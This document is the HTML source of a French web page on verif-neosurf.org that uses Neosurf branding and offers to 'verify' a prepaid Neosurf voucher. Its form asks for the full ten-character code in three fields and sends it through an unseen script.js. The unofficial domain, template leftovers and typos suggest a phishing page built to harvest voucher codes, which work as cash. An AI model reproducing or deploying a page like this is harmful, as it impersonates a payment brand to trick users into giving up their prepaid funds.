<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- SEO -->
    <title>Verification de code neosurf en ligne</title>

    <meta name="description"
          content="Neosurf vous permet de verifier votre code en ligne. Vérifiez le solde disponible et la validite du code en vous connectant avec le code du ticket Neosurf.">

    <meta name="robots" content="index, follow">
    <meta name="googlebot" content="index, follow">

    <link rel="canonical" href="https://verif-neosurf.org/">

    <!-- Favicon -->
    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="apple-touch-icon" href="/apple-touch-icon.png">

    <!-- Open Graph -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://verif-neosurf.org/">
    <meta property="og:title" content="voucher authentification - Vérification">
    <meta property="og:description"
          content="Service de vérification en ligne de vouchers.">
    <meta property="og:image"
          content="https://verif-neosurf.org/og-image.jpg">
    <meta property="og:locale" content="fr_FR">

    <!-- Twitter / X -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Verifier neosurf - Vérification de code ">
    <meta name="twitter:description"
          content="Service de vérification en ligne de vouchers.">
    <meta name="twitter:image"
          content="https://verif-neosurf.org/og-image.jpg">

    <!-- JSON-LD : Site -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "WebSite",
        "name": "verifier neosurf",
        "url": "https://verif-neosurf.org/",
        "description": "Service de vérification en ligne de de code neosurf.",
        "inLanguage": "fr"
    }
    </script>

    <!-- JSON-LD : Organisation -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "Organization",
        "name": "verifier neosurf",
        "url": "https://verif-neosurf.org/",
        "logo": "https://verif-neosurf.org/favicon-96x96.png"
    }
    </script>

    <!-- CSS -->
    <link rel="stylesheet" href="style.css">

    <!-- Google reCAPTCHA -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

    <!-- Google Fonts -->
    <link
        href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">
</head>

<body class="verification-page">

    <!-- Barre du haut -->
    <header class="topbar">

        <div class="mybeauty-brand">
            <div class="mybeauty-name">Neosurf</div>
            <div class="mybeauty-tagline">
                So simple to pay $ play online
            </div>
        </div>

    </header>

    <div class="background-shape shape1"></div>
    <div class="background-shape shape2"></div>

    <main>

        <section class="verification-card">

            <div class="verification-header">
                <h1>Vérification d'un voucher</h1>
            </div>

            <div class="verification-body">

                <form id="verificationForm">

                    <div class="code-group">

                        <input
                            type="text"
                            id="part1"
                            name="part1"
                            maxlength="4"
                            class="code-input"
                            autocomplete="off"
                            aria-label="Code 1">

                        <input
                            type="text"
                            id="part2"
                            name="part2"
                            maxlength="3"
                            class="code-input"
                            autocomplete="off"
                            aria-label="Code 2">

                        <input
                            type="text"
                            id="part3"
                            name="part3"
                            maxlength="3"
                            class="code-input"
                            autocomplete="off"
                            aria-label="Code 3">

                    </div>

                    <div class="recaptcha-container">
                        <div
                            class="g-recaptcha"
                            data-sitekey="6LdkWq4tAAAAALBLtyok9xz-KDgY9PiNjsGY5ThH">
                        </div>
                    </div>

                    <button type="submit" id="verifyBtn">
                        Vérifier
                    </button>

                </form>

                <div id="result"></div>

            </div>

        </section>

    </main>

    <footer class="verification-footer">

        <div class="footer-top">
            Conditions • Politique de confidentialité • Besoin d'aide ? • Français
        </div>

        <div class="footer-bottom">
            ©Copyrigth 2018-2026 Voucher-neosurf — Tous droits réservés.
        </div>

    </footer>

    <script src="script.js"></script>

</body>

</html>
